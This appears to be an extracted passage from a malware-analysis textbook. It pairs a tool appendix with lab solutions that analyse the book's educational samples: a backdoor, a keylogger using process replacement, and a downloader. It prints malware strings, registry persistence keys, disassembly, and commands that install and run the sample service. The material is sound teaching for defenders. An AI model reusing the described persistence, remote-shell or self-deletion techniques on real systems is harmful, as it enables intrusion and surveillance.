strate how to use ImmDbg’s Python scripting ability. You can download 
ImmDbg from http://www.immunityinc.com/.
[Word Count: 73]

Import REConstructor
Import REConstructor (ImpREC) is a useful tool when you are manually 
unpacking a piece of malware. The import address table (IAT) is often 
damaged when you dump memory while unpacking, and you can use 
ImpREC to repair the table. You provide the malware running in mem-
ory and a dumped version on disk, and ImpREC does its best to repair 
the binary. You can download ImpREC for free from http://tuts4you.com/
download.php?view.415.
[Word Count: 73]

INetSim
INetSim is a Linux-based software suite for simulating common network 
services that we find useful for dynamic analysis. Be sure to install it on a 
Linux virtual machine, and set it up on the same virtual network as your 
malware analysis Windows VM. INetSim can emulate many popular ser-
vices, such as a Microsoft Internet Information Services (IIS) web server, 
and can even listen on all ports for incoming connections. We discuss 
INetSim in Chapter 3. You can download it for free from http://www
.inetsim.org/.
[Word Count: 86]

LordPE
LordPE is a free tool for dumping an executable from memory. It allows 
PE editing and can be used to repair a program you dumped from mem-
ory using another method. LordPE is most commonly used for unpack-
ing malware. You can download it for free from http://www.woodmann
.com/collaborative/tools/index.php/LordPE.
[Word Count: 50]

Malcode Analyst Pack
The Malcode Analyst Pack contains a series of utilities, one of which 
installs useful Windows shell extensions for strings, an MD5 hash calcu-
lator, and a CHM decompile option. The CHM decompile option is 
handy when dealing with malicious Windows help files. Also included is 
FakeDNS, a useful tool for spoofing DNS responses to a user-specified
[Word Count: 59]

address. While these utilities are no longer officially supported, you 
might still be able to download them from http://labs.idefense.com/
software/download/?downloadID=8.
[Word Count: 20]

Netcat
Netcat, known as the “TCP/IP Swiss Army knife,” can be used to monitor 
or start inbound and outbound connections. Netcat is most useful dur-
ing dynamic analysis for listening on ports that you know the malware 
connects to, because Netcat prints all the data it receives to the screen 
via standard output. We cover Netcat usage for dynamic analysis in Chap-
ter 3 and also talk about how attackers use it in Chapter 11. Netcat is 
installed by default in Cygwin and on most Linux distributions. You can 
download the Windows version for free from http://joncraton.org/media/
files/nc111nt.zip.
[Word Count: 98]

OfficeMalScanner
OfficeMalScanner is a free command-line tool for finding malicious 
code in Microsoft Office documents. It locates shellcode, embedded PE 
files, and OLE streams in Excel, Word, and PowerPoint documents, and 
can decompress the newer format of Microsoft Office documents. We 
recommend running OfficeMalScanner with the scan and brute options 
on pre–Office 2007 documents and with the inflate option on post–
Office 2007 documents. You can download OfficeMalScanner from 
http://www.reconstructer.org/.
[Word Count: 70]

OllyDbg
OllyDbg is one of the most widely used debuggers for malware analysis. 
We discuss OllyDbg extensively throughout the book, and Chapter 9 pro-
vides an in-depth introduction to the tool. OllyDbg is a user-mode x86 
debugger with a GUI. Several plug-ins are available for OllyDbg, such as 
OllyDump for use while unpacking (discussed in Chapter 18). You can 
download OllyDbg for free from http://www.ollydbg.de/.
[Word Count: 65]

OSR Driver Loader
OSR Driver Loader is a freely available tool for loading a device driver 
into memory. It is a GUI-based tool used for easily loading and starting 
a driver without rebooting. This is useful when you are dynamically
[Word Count: 40]

analyzing a malicious device driver and don’t have the installer. We dis-
cuss the OSR Driver Loader tool in Chapter 10. You can download it 
from http://www.osronline.com/.
[Word Count: 27]

PDF Dissector
PDF Dissector is a commercial GUI-based PDF analysis tool that graphi-
cally parses PDF elements and automatically decompresses objects, 
making it easy to extract malicious JavaScript. The program includes a 
JavaScript deobfuscator and interpreter to help you understand and 
execute malicious scripts. PDF Dissector can also be used to identify 
known vulnerabilities. This tool is available for purchase from http://
www.zynamics.com/.
[Word Count: 63]

PDF Tools
PDF Tools is the classic tool kit for PDF analysis. The tool kit consists of 
two tools: pdfid.py and pdf-parser.py. pdfid.py scans a PDF for objects and 
tells you if it thinks a PDF contains JavaScript. Since most malicious PDFs 
use JavaScript, this information can help you quickly identify potentially 
risky PDFs. pdf-parser.py helps you examine the contents and important 
objects of a PDF file without rendering it. You can download the PDF 
tools for free from http://blog.didierstevens.com/programs/pdf-tools/.
[Word Count: 80]

PE Explorer
PE Explorer is a useful tool for viewing the PE header, sections, and 
import/export tables. It is more powerful than PEview because it allows 
you to edit structures. PE Explorer contains static unpackers for UPX-, 
Upack-, and NsPack-compressed files. This unpacking feature is seam-
less and saves a lot of time. You simply load the packed binary into PE 
Explorer, and it automatically unpacks the file. You can download a trial 
version or purchase the commercial version of PE Explorer from http://
www.heaventools.com/.
[Word Count: 85]

PEiD
PEiD is a free static analysis tool used for packer and compiler detection. 
It includes more than 600 signatures for detecting packers, cryptors, and 
compilers in PE format files. PEiD also has plug-ins available for down-
load, the most useful of which is Krypto ANALyzer (KANAL). KANAL 
can be used to find common cryptographic algorithms in PE files and 
provides the ability to export the information to IDA Pro. We discuss 
PEiD in Chapters 1, 13, and 18. Although the PEiD project has been 
discontinued, you should still be able to download the tool from http://
www.peid.info/.
[Word Count: 98]

PEview
PEview is a freely available tool for viewing the PE file structure. You can 
view the PE header, individual sections, and the import/export tables. 
We use PEview throughout the book and discuss it in Chapter 1. You can 
download PEview from http://wjradburn.com/software/.
[Word Count: 43]

Process Explorer
Process Explorer is a powerful task manager that is used in dynamic anal-
ysis to provide insight into processes currently running on a system. Pro-
cess Explorer can show you the DLLs for individual processes, handles, 
events, strings, and so on. We discuss Process Explorer in Chapter 3. You 
can download Process Explorer as part of the Sysinternals Suite of tools 
from http://www.sysinternals.com/.
[Word Count: 65]

Process Hacker
Process Hacker is a powerful task manager similar to Process Explorer, 
but with many added features. It can scan for strings and regular expres-
sions in memory, inject or unload a DLL, load a driver, create or start 
a service, and so on. You can download Process Hacker from http://
processhacker.sourceforge.net/.
[Word Count: 53]

Process Monitor
Process Monitor (procmon) is a dynamic analysis tool useful for viewing 
real-time filesystem, registry, and process activity. You can filter its output 
to remove the noise. We discuss Process Monitor in Chapter 3. You can 
download Process Monitor as part of the Sysinternals Suite of tools from 
http://www.sysinternals.com/.
[Word Count: 50]

Python
The Python programming language allows you quickly code tasks when 
performing malware analysis. Throughout the book and labs, we use 
Python. As discussed in Chapters 5 and 9, IDA Pro and Immunity Debug-
ger have built-in Python interpreters, allowing you to quickly automate 
tasks or change the interface. We recommend learning Python and 
installing it on your analysis machine. Download Python for free from 
http://www.python.org/.
[Word Count: 66]

Regshot
Regshot is a dynamic analysis tool that allows you to take and compare 
two registry snapshots. To use it, you simply take a snapshot of the regis-
try, run the malware, wait for it to finish making any system changes, take 
the second snapshot, and then compare the two. Regshot can also be 
used for taking and comparing two snapshots of any filesystem directory 
you specify. You can download Regshot for free from http://sourceforge
.net/projects/regshot/.
[Word Count: 76]

Resource Hacker
Resource Hacker is a useful static analysis utility for viewing, renaming, 
modifying, adding, deleting, and extracting resources for PE-formatted 
binaries. The tool works with both x86 and x64 architectures. Because 
malware often extracts more malware, a DLL, or a driver from its resource 
section at runtime, we find this tool useful for extracting those sections 
easily without running the malware. We discuss Resource Hacker in 
Chapter 1 and the Chapter 12 labs. You can download Resource Hacker 
from http://www.angusj.com/resourcehacker/.
[Word Count: 81]

Sandboxes
In Chapter 3, we discuss the pluses and minuses of using sandboxes. 
Many sandboxes are publicly available, and you can also write your own. 
Public sandboxes are a decent choice because they are always being 
developed in an effort to stay on top of the market. We demonstrate 
GFI Sandbox in Chapter 3, but there are many others, including Joe 
Sandbox, BitBlaze, Comodo, ThreatExpert, Anubis, Norman, Cuckoo, 
Zero Wine, Buster Sandbox, and Minibis. As with hex editors, everyone 
has a preference, so try a few to see what works for you.
[Word Count: 92]

Sandboxie and Buster Sandbox Analyzer
Sandboxie is a program that runs programs in an isolated environment 
to prevent them from making permanent changes to your system. Sand-
boxie was designed to allow secure web browsing, but its sandbox aspect 
makes it useful for malware analysis. For example, you can use it to cap-
ture filesystem and registry accesses of the program you are sandboxing. 
Buster Sandbox Analyzer (BSA) can be used with Sandboxie to provide 
automated analysis and reporting. Sandboxie and BSA can be down-
loaded from http://www.sandboxie.com/ and http://bsa.isoftware.nl/.
[Word Count: 90]

Snort
Snort is the most popular open source network intrusion detection sys-
tem (IDS). We discuss writing network-based signatures for Snort in 
Chapter 14. Snort can be run actively or offline against packet captures. 
If you write network signatures for malware, using Snort to test them is a 
good place to start. You can download Snort from http://www.snort.org/.
[Word Count: 58]

Strings
Strings is a useful static analysis tool for examining ASCII and Unicode 
strings in binary data. Using Strings is often a quick way to get a high-
level overview of malware capability, but the program’s usefulness can be 
thwarted by packing and string obfuscation. We discuss Strings in Chap-
ter 1. You can download Strings as part of the Sysinternals Suite of tools 
from http://www.sysinternals.com/.
[Word Count: 66]

TCPView
TCPView is a tool for graphically displaying detailed listings of all TCP 
and UDP endpoints on your system. This tool is useful in malware analy-
sis because it allows you to see which process owns a given endpoint. 
TCPView can help you track down a process name when your analysis 
machine connects over a port and you have no idea which process is 
responsible (as often happens with process injection, as discussed in 
Chapter 12). You can download TCPView as part of the Sysinternals 
Suite of tools from http://www.sysinternals.com/.
[Word Count: 90]

The Sleuth Kit
The Sleuth Kit (TSK) is a C library and set of command-line tools for 
forensic analysis that can be used to find alternate data streams and files 
hidden by rootkits. TSK does not rely on the Windows API to process 
NTFS and FAT filesystems. You can run TSK on Linux or using Cygwin in 
Windows. You can download TSK for free from http://www.sleuthkit.org/.
[Word Count: 66]

Truman
Truman is a tool for creating a safe environment without using virtual 
machines. It consists of a Linux server and a client machine running 
Windows. Like INetSim, Truman emulates the Internet, but it also pro-
vides functionality to easily grab memory from the Windows machine 
and reimage it quickly. Truman comes with scripts to emulate services 
and perform analysis on Linux. Even though this tool is no longer in 
development, it can help you understand how to set up your own bare-
metal environment. You can download Truman for free from http://
www.secureworks.com/research/tools/truman/.
[Word Count: 94]

WinDbg
WinDbg is the most popular all-around debugger, distributed freely by 
Microsoft. You can use it to debug user-mode, kernel-mode, x86, and x64 
malware. WinDbg lacks OllyDbg’s robust GUI, providing a command-
line interface instead. In Chapter 10, we focus on the kernel-mode usage 
of WinDbg. Many malware analysts choose to use OllyDbg for user-mode 
debugging and WinDbg for kernel debugging. WinDbg can be down-
loaded independently or as part of the Windows SDK from http://msdn
.microsoft.com/.
[Word Count: 77]

Wireshark
Wireshark is an open source network packet analyzer and useful tool for 
dynamic analysis. You can use it to capture network traffic generated by 
malware and to analyze many different protocols. Wireshark is the most 
popular freely available tool for packet capturing and has an easy-to-use 
GUI. We discuss Wireshark usage in Chapter 3. You can download Wire-
shark from http://www.wireshark.org/.
[Word Count: 62]

UPX
Ultimate Packer for eXecutables (UPX) is the most popular packer used 
by malware authors. In Chapters 1 and 18, we discuss how to automati-
cally and manually unpack malware that uses UPX. If you encounter this 
packer in the wild, try to unpack the malware with upx –d. You can down-
load this packer from http://upx.sourceforge.net/.
[Word Count: 57]

VERA
Visualizing Executables for Reversing and Analysis (VERA) is a tool for 
visualizing compiled executables for malware analysis. It uses the Ether
[Word Count: 22]

framework to generate visualizations based on dynamic trace data to 
help with analysis. VERA gives you a high-level overview of malware and 
can help with unpacking. It can also interface with IDA Pro to help you 
browse between the VERA graphs and IDA Pro disassembly. You can 
download VERA from http://www.offensivecomputing.net/.
[Word Count: 51]

VirusTotal
VirusTotal is an online service that scans malware using many different 
antivirus programs. You can upload a file directly to VirusTotal, and it 
will check the file with more than 40 different antivirus engines. If you 
don’t want to upload your malware, you can also search the MD5 hash to 
see if VirusTotal has seen the sample before. We discuss VirusTotal at the 
start of Chapter 1 since it is often a useful first step during malware anal-
ysis. You can access VirusTotal at http://www.virustotal.com/.
[Word Count: 86]

VMware Workstation
VMware Workstation is a popular desktop virtualization product. There 
are many alternatives to VMware, but we use it in this book due to its 
popularity. Chapter 2 highlights many VMware features, such as virtual 
networking, snapshotting (which allows you to save the current state of a 
virtual machine), and cloning an existing virtual machine. You can pur-
chase VMware Workstation from http://www.vmware.com/ or download 
VMware Player (with limited functionality) for free from the same site.
[Word Count: 77]

Volatility Framework
The Volatility Framework is an open source collection of tools written in 
Python for analyzing live memory captures. This suite of tools is useful 
for malware analysis, as you can use it to extract injected DLLs, perform 
rootkit detection, find hidden processes, and so on. This tool suite has 
many users and contributors, so new capabilities are constantly being 
developed. You can download the latest version from http://code.google
.com/p/volatility/.
[Word Count: 71]

YARA
YARA is an open source project used to identify and classify malware 
samples that will allow you to create descriptions of malware families 
based on strings or any other binary patterns you find in them. These 
descriptions are called rules, and they consist of a set of strings and logic. 
Rules are applied to binary data like files or memory in order to classify a 
sample. This tool is useful for creating your own custom antivirus-like 
software and signatures. You can download YARA for free from http://
code.google.com/p/yara-project/.
[Word Count: 89]

Zero Wine
Zero Wine is an open source malware sandbox that is distributed as a vir-
tual machine running Debian Linux. Malware samples are executed using 
Zero Wine to emulate the Windows API calls, and the calls are logged to 
report on malicious activity. Zero Wine can even catch and defeat certain 
anti-virtual machine, anti-debugging, and anti-emulation techniques. You 
can download Zero Wine from http://zerowine.sourceforge.net/.
[Word Count: 65]

1.
These files were written specifically for this book, so as of this writing, 
you should not find a signature for them on VirusTotal.com. Of course, if 
these files become part of the antivirus signatures as a result of the publi-
cation of this book, the results will be different.
[Word Count: 50]

2.
Both files were compiled on December 19, 2010, within 1 minute of each 
other.
[Word Count: 15]

3.
There are no indications that either file is packed or obfuscated.
[Word Count: 12]

4.
The interesting imports from Lab01-01.exe are FindFirstFile, FindNextFile, 
and CopyFile. These imports tell us that the program searches the file-
system and copies files. The most interesting imports from Lab01-01.dll 
are CreateProcess and Sleep. We also see that this file imports functions 
from WS2_32.dll, which provides network functionality.
[Word Count: 49]

5.
Examine C:\Windows\System32\kerne132.dll for additional malicious activ-
ity. Note that the file kerne132.dll, with the number 1 instead of the letter 
l, is meant to look like the system file kernel32.dll. This file can be used as 
a host indicator to search for the malware.
[Word Count: 45]

6.
The .dll file contains a reference to local IP address 127.26.152.13. This 
address is an artifact of this program having been created for educational 
and not malicious purposes. If this was real malware, the IP address should 
be routable, and it would be a good network-based indicator for use in 
identifying this malware.
[Word Count: 54]

7.
The .dll file is probably a backdoor. The .exe file is used to install or run 
the DLL.
[Word Count: 19]

1.
As of this writing, the file matches 3 of 41 antivirus signatures.
[Word Count: 13]

2.
There are several indications that the program is packed with UPX. You 
can unpack it by downloading UPX and running upx –d.
[Word Count: 23]

3.
After unpacking the file, you’ll see that the most interesting imports are 
CreateService, InternetOpen, and InternetOpenURL.
[Word Count: 17]

4.
You should check infected machines for a service called Malservice and 
for network traffic to http://www.malwareanalysisbook.com/.
[Word Count: 17]

Having identified the program as packed, we can unpack it by download-
ing UPX from http://upx.sourceforge.net/ and running the following command:
[Word Count: 21]

1.
As of this writing, 25 of 43 virus engines identify this sample as malware.
[Word Count: 15]

2.
The file is packed, but we can’t unpack it at this time.
[Word Count: 13]

3.
This question can’t be answered without unpacking the file.
[Word Count: 10]

4.
This question can’t be answered without unpacking the file.
[Word Count: 10]

1.
As of this writing, 16 of 43 antivirus engines identify this as malicious 
code that downloads and/or drops additional malware onto a system.
[Word Count: 24]

2.
There are no indications that the file is packed or obfuscated.
[Word Count: 12]

3.
According to the file header, this program was compiled in August 2019. 
Clearly, the compile time is faked, and we can’t determine when the file 
was compiled.
[Word Count: 28]

4.
The imports from advapi32.dll indicate that the program is doing some-
thing with permissions. The imports from WinExec and WriteFile, along 
with the results from VirusTotal.com, tell us that the program writes a file 
to disk and then executes it. There are also imports for reading informa-
tion from the resource section of the file.
[Word Count: 56]

5.
The string \system32\wupdmgr.exe indicates that this program could create 
or modify a file at that location. The string www.malwareanalysisbook.com/
updater.exe probably indicates where additional malware is stored, ready 
for download.
[Word Count: 31]

6.
The resource section contains another PE executable. Use Resource 
Hacker to save the resource as binary data, and then analyze the binary 
file as you would analyze any executable. The executable in the resource 
section is a downloader program that downloads additional malware.
[Word Count: 44]

1.
The malware appears to be packed. The only import is ExitProcess, 
although the strings appear to be mostly clear and not obfuscated.
[Word Count: 23]

2.
The malware creates a mutex named WinVMX32, copies itself into C:\
Windows\System32\vmx32to64.exe. and installs itself to run on system 
startup by creating the registry key HKLM\SOFTWARE\Microsoft\Windows\
CurrentVersion\Run\VideoDriver set to the copy location.
[Word Count: 33]

3.
The malware beacons a consistently sized 256-byte packet containing 
seemingly random data after resolving www.practicalmalwareanalysis.com.
[Word Count: 16]

We begin with basic static analysis techniques, by looking at the malware’s PE 
file structure and strings. Figure 3-1L shows that only kernel32.dll is imported.
[Word Count: 25]

Figure 3-1L: PEview of Lab03-01.exe showing only one import
[Word Count: 9]

There is only one import to this binary, ExitProcess, as seen at  in the 
import address table. Without any imports, it is tough to guess the program’s 
functionality. This program may be packed, since the imports will likely be 
resolved at runtime.
Next, we look at the strings, as shown in the following listing.
[Word Count: 55]

StubPath
SOFTWARE\Classes\http\shell\open\commandV
Software\Microsoft\Active Setup\Installed Components\
test
www.practicalmalwareanalysis.com
admin
VideoDriver
WinVMX32-
vmx32to64.exe
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
AppData
[Word Count: 15]

Figure 3-2L: Process Explorer view of Lab03-01.exe 
showing the mutex it creates
[Word Count: 12]

Next, we use procmon to look for additional information. We bring up 
the Filter dialog by selecting FilterFilter, and then set three filters: one on 
the Process Name (to show what Lab03-01.exe does to the system), and two 
more on Operation, as shown in Figure 3-3L. We include RegSetValue and 
WriteFile to show changes the malware makes to the filesystem and registry.
[Word Count: 62]

Figure 3-3L: Process Monitor Filter dialog showing filters set on 
Process Name and Operation
[Word Count: 14]

Having set our filters, we click Apply to see the filtered result. The entries 
are reduced from thousands to just the 10 seen in Figure 3-4L. Notice that 
there is only one entry for WriteFile, and there are nine entries for RegSetValue.
[Word Count: 42]

Figure 3-4L: Procmon filtered results (with three filters set)
[Word Count: 9]

Next, we double-click the entry at  in the figure, and see that the mal-
ware wrote the following data to the registry:
[Word Count: 23]

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VideoDriver:C:\WINDOWS\system32\vmx32to64.exe
[Word Count: 1]

C:\>nc -l -p 443
\7⌠ëÅ¿A :°I,j!Yûöí?Ç:lƒh↨O±ⁿ)α←εg%┬∟#xp╧O+╙3Ω☺åiE☼?═■p}»╝/
º_∞~]ò£»ú¿¼▬F^"Äμ▒├
♦∟ªòj╡<û(y!∟♫5Z☺!♀va╪┴╗úI┤ßX╤â8╫²ñö'i¢k╢╓(√Q‼%O¶╡9.▐σÅw♀‼±Wm^┐#ñæ╬°☻/
[⌠│⌡xH╫▲É║‼
x?╦Æº│ºLƒ↕x┌gYΦ<└§☻μºx)╤SBxè↕◄╟♂4AÇ
[Word Count: 10]

It looks like we got lucky: The malware appears to beacon out over port 
443, and we were listening with Netcat over ports 80 and 443. (Use INetSim 
to listen on all ports at once.) We run this test several times, and the data 
appears to be random each time.
A follow-up in Wireshark tells us that the beacon packets are of consis-
tent size (256 bytes) and appear to contain random data not related to the 
SSL protocol that normally operates over port 443.
[Word Count: 85]

1.
To install the malware as a service, run the malware’s exported installA 
function via rundll32.exe with rundll32.exe Lab03-02.dll,installA.
[Word Count: 19]

2.
To run the malware, start the service it installs using the net command 
net start IPRIP.
[Word Count: 17]

3.
Use Process Explorer to determine which process is running the service. 
Since the malware will be running within one of the svchost.exe files on 
the system, hover over each one until you see the service name, or search 
for Lab03-02.dll using the Find DLL feature of Process Explorer.
[Word Count: 49]

4.
In procmon you can filter on the PID you found using Process Explorer.
[Word Count: 14]

5.
By default, the malware installs as the service IPRIP with a display name of 
Intranet Network Awareness (INA+) and description of “Depends INA+, Col-
lects and stores network configuration and location information, and 
notifies applications when this information changes.” It installs itself for 
persistence in the registry at HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\
Parameters\ServiceDll: %CurrentDirectory%\Lab03-02.dll. If you rename 
Lab03-02.dll to something else, such as malware.dll, then it writes malware.dll 
into the registry key, instead of using the name Lab03-02.dll.
[Word Count: 76]

6.
The malware resolves the domain name practicalmalwareanalysis.com and 
connects to that host over port 80 using what appears to be HTTP. It 
does a GET request for serve.html and uses the User-Agent %ComputerName% 
Windows XP 6.11.
[Word Count: 37]

We begin with basic static analysis by looking at the PE file structure and 
strings. Figure 3-5L shows that this DLL has five exports, as listed from  and 
below. The export ServiceMain suggests that this malware needs to be installed 
as a service in order to run properly.
[Word Count: 49]

Figure 3-5L: PEview of Lab03-02.dll exports
[Word Count: 6]

The following listing shows the malware’s interesting imported functions 
in bold.
[Word Count: 11]

OpenService
DeleteService
OpenSCManager
CreateService
RegOpenKeyEx
[Word Count: 5]

RegQueryValueEx
RegCreateKey
RegSetValueEx
InternetOpen
InternetConnect
HttpOpenRequest
HttpSendRequest
InternetReadFile
[Word Count: 8]

These include service-manipulation functions, such as CreateService, and 
registry-manipulation functions, such as RegSetValueEx. Imported networking 
functions, such as HttpSendRequest, suggest that the malware uses HTTP.
Next, we examine the strings, as shown in the following listing.
[Word Count: 36]

Y29ubmVjdA==
practicalmalwareanalysis.com
serve.html
dW5zdXBwb3J0
c2xlZXA=
Y21k
cXVpdA==
Windows XP 6.11
HTTP/1.1
quit
exit
getfile
cmd.exe /c 
Depends INA+, Collects and stores network configuration and location 
information, and notifies applications when this information changes.
%SystemRoot%\System32\svchost.exe -k 
SYSTEM\CurrentControlSet\Services\
Intranet Network Awareness (INA+)
%SystemRoot%\System32\svchost.exe -k netsvcs
netsvcs
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
IPRIP
[Word Count: 47]

After installing the malware, we use Process Explorer to confirm that it 
has terminated by making sure that rundll32.exe is no longer in the process 
listing. Next, we take a second snapshot with Regshot to see if the malware 
installed itself in the registry.
The edited Regshot results are shown in the following listing.
[Word Count: 54]

----------------------------------
Keys added
----------------------------------
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP 
----------------------------------
Values added
----------------------------------
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Parameters\ServiceDll: 
     "z:\Lab03-02.dll"
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\ImagePath: 
     "%SystemRoot%\System32\svchost.exe -k netsvcs" 
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\DisplayName: 
     "Intranet Network Awareness (INA+)" 
HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Description: 
     "Depends INA+, Collects and stores network configuration and location 
information, and notifies applications when this information changes." 
[Word Count: 42]

c:\>net start IPRIP
The Intranet Network Awareness (INA+) service is starting.
The Intranet Network Awareness (INA+) service was started successfully.
[Word Count: 20]

The fact that the display name (INA+) matches the information found in 
the registry tells us that our malicious service has started.
Next, we open Process Explorer and attempt to find the process in which 
the malware is running by selecting FindFind Handle or DLL to open the 
dialog shown in Figure 3-6L. We enter Lab03-02.dll and click Search. As shown 
in the figure, the result tells us that Lab03-02.dll is loaded by svchost.exe with 
the PID 1024. (The specific PID may differ on your system.)
[Word Count: 86]

Figure 3-6L: Searching for a DLL in Process Explorer
[Word Count: 9]

In Process Explorer, we select ViewLower Pane ViewDLLs and 
choose the svchost.exe running with PID 1024. Figure 3-7L shows the result. 
The display name Intranet Network Awareness (INA+) shown at  confirms that 
the malware is running in svchost.exe, which is further confirmed when we see 
at  that Lab03-02.dll is loaded.
[Word Count: 52]

Figure 3-7L: Examining service malware in Process Explorer
[Word Count: 8]

Next, we turn our attention to our network analysis tools. First, we check 
ApateDNS to see if the malware performed any DNS requests. The output 
shows a request for practicalmalwareanalysis.com, which matches the strings 
listing shown earlier.
[Word Count: 37]

NOTE
It takes 60 seconds after starting the service to see any network traffic (the program does 
a Sleep(60000) before attempting network access). If the networking connection fails for 
any reason (for example, you forgot to set up ApateDNS), it waits 10 minutes before 
attempting to connect again.
[Word Count: 48]

We complete our network analysis by examining the Netcat results, as 
follows:
[Word Count: 12]

c:\>nc -l -p 80
GET /serve.html HTTP/1.1
Accept: */*
User-Agent: MalwareAnalysis2 Windows XP 6.11
Host: practicalmalwareanalysis.com
[Word Count: 16]

1.
The malware performs process replacement on svchost.exe.
[Word Count: 8]

2.
Comparing the disk image of svchost.exe with its memory image 
shows that they are not the same. The memory image has strings 
such as practicalmalwareanalysis.log and [ENTER], but the disk image 
has neither.
[Word Count: 34]

3.
The malware creates the log file practicalmalwareanalysis.log.
[Word Count: 8]

4.
The program performs process replacement on svchost.exe to launch 
a keylogger.
[Word Count: 12]

Figure 3-8L: Process Explorer view of orphaned svchost.exe
[Word Count: 8]

Figure 3-9L: Process Explorer shows strings that are not normally contained in svchost.exe.
[Word Count: 13]

Figure 3-10L: Procmon output of svchost.exe with PID 388
[Word Count: 9]

Opening practicalmalwareanalysis.log with a simple text editor reveals the 
keystrokes you entered in Notepad. We conclude that this malware is a key-
logger that uses process replacement on svchost.exe.
[Word Count: 29]

1.
When you run this malware by double-clicking it, the program immedi-
ately deletes itself.
[Word Count: 15]

2.
We suspect that we may need to provide a command-line argument or a 
missing component to the program.
[Word Count: 19]

3.
We try using the command-line parameters shown in the strings listing 
(like -in), but doing so is not fruitful. More in-depth analysis is required. 
(We’ll analyze this malware further in the labs for Chapter 9.)
[Word Count: 36]

We begin with basic static analysis, examining the PE file structure and 
strings. We see that this malware imports networking functionality, service-
manipulation functions, and registry-manipulation functions. In the follow-
ing listing, we notice a number of interesting strings.
[Word Count: 39]

SOFTWARE\Microsoft \XPS
\kernel32.dll
 HTTP/1.0
GET
NOTHING
DOWNLOAD
UPLOAD
SLEEP
cmd.exe
 >> NUL
/c del 
http://www.practicalmalwareanalysis.com
[Word Count: 15]

NT AUTHORITY\LocalService
 Manager Service
.exe
%SYSTEMROOT%\system32\
k:%s h:%s p:%s per:%s
-cc
-re
-in
[Word Count: 13]

Figure 3-11L: Procmon view of the Process Create performed for self-deletion
[Word Count: 11]

We can try to run the malware from the command line using the command-
line options we saw in the strings listing (-in, -re, and –cc), but all of them fail 
and result in the program deleting itself. There isn’t much more we can do 
with basic dynamic techniques at this point, until we dig deeper into the mal-
ware. (We will revisit this malware in the Chapter 9 labs.)
[Word Count: 70]

1.
DllMain is found at 0x1000D02E in the .text section.
[Word Count: 10]

2.
The import for gethostbyname is found at 0x100163CC in the .idata section.
[Word Count: 13]

3.
The gethostbyname import is called nine times by five different functions 
throughout the malware.
[Word Count: 15]

4.
A DNS request for pics.practicalmalwareanalysis.com will be made by the 
malware if the call to gethostbyname at 0x10001757 succeeds.
[Word Count: 20]

5.
IDA Pro has recognized 23 local variables for the function at 0x10001656.
[Word Count: 13]

6.
IDA Pro has recognized one parameter for the function at 0x10001656.
[Word Count: 12]

7.
The string \cmd.exe /c is located at 0x10095B34.
[Word Count: 9]

8.
That area of code appears to be creating a remote shell session for the 
attacker.
[Word Count: 16]

9.
The OS version is stored in the global variable dword_1008E5C4.
[Word Count: 11]

10. The registry values located at HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
WorkTime and WorkTimes are queried and sent over the remote shell 
connection.
[Word Count: 19]

11. The PSLIST export sends a process listing across the network or finds a 
particular process name in the listing and gets information about it.
[Word Count: 25]

12. GetSystemDefaultLangID, send, and sprintf are API calls made from 
sub_10004E79. This function could be renamed to something useful 
like GetSystemLanguage.
[Word Count: 21]

13. DllMain calls strncpy, strnicmp, CreateThread, and strlen directly. At a depth 
of 2, it calls a variety of API calls, including Sleep, WinExec, gethostbyname, 
and many other networking function calls.
[Word Count: 31]

14. The malware will sleep for 30 seconds.
[Word Count: 8]

16. These arguments correspond to three symbolic constants: IPPROTO_TCP, 
SOCK_STREAM, and AF_INET.
[Word Count: 12]

17. The in instruction is used for virtual machine detection at 0x100061DB, 
and the 0x564D5868h corresponds to the VMXh string. Using the cross-
reference, we see the string Found Virtual Machine in the caller function.
[Word Count: 35]

18. Random data appears to exist at 0x1001D988.
[Word Count: 8]

19. If you run Lab05-01.py, the random data is unobfuscated to reveal a 
string.
[Word Count: 14]

20. By pressing the A key on the keyboard, we can turn this into the readable 
string: xdoor is this backdoor, string decoded for Practical Malware Analysis 
Lab :)1234.
[Word Count: 29]

21. The script works by XOR’ing 0x50 bytes of data with 0x55 and modifying 
the bytes in IDA Pro using PatchByte.
[Word Count: 21]

Figure 5-1L: Cross-references to gethostbyname
[Word Count: 5]

We press G on the keyboard to quickly navigate to 0x10001757. Once at 
this location, we see the following code, which calls gethostbyname.
[Word Count: 23]

1000174E         mov     eax, off_10019040
10001753         add     eax, 0Dh 
10001756         push    eax
10001757         call    ds:gethostbyname
[Word Count: 15]

Figure 5-2L: Adjustment of the string pointer to access the URL
[Word Count: 11]

Figure 5-3L: IDA Pro function layout—
recognizing local variables and parameters
[Word Count: 11]

10001673        call    sub_10003695
10001678        mov     dword_1008E5C4, eax
[Word Count: 7]

We see that EAX is moved into dword_1008E5C4, and that EAX is the 
return value from the function call made in the previous instruction. 
Therefore, we need to determine what that function returns. To do so, we 
examine sub_10003695 by double-clicking it and looking at the disassembly. 
The sub_10003695 function contains a call to GetVersionEx, which obtains infor-
mation about the current version of the OS, as shown in the following listing.
[Word Count: 72]

100036AF        call    ds:GetVersionExA
100036B5        xor     eax, eax
100036B7        cmp     [ebp+VersionInformation.dwPlatformId], 2
100036BE        setz    al
[Word Count: 14]

The dwPlatformId is compared to the number 2 in order to determine how 
to set the AL register. AL will be set if the PlatformId is VER_PLATFORM_WIN32_NT. 
This is just a simple check to make sure that the OS is Windows 2000 or 
higher, and we can conclude that the global variable will typically be set to 1.
As previously discussed, the remote shell function at 0x1000FF58 con-
tains a series of memcmp functions starting at 0x1000FF58. At 0x10010452, we 
see the memcmp with robotwork, as follows:
[Word Count: 87]

10010444         push    9                       ; Size
10010446         lea     eax, [ebp+Dst]
1001044C         push    offset aRobotwork       ; "robotwork"
10010451         push    eax                     ; Buf1
10010452         call    memcmp
[Word Count: 23]

10010457         add     esp, 0Ch
1001045A         test    eax, eax
1001045C         jnz     short loc_10010468 
1001045E         push    [ebp+s]                 ; s
10010461         call    sub_100052A2 
[Word Count: 23]

NOTE
Performing a quick analysis like this is an easy way to get a high-level overview of a 
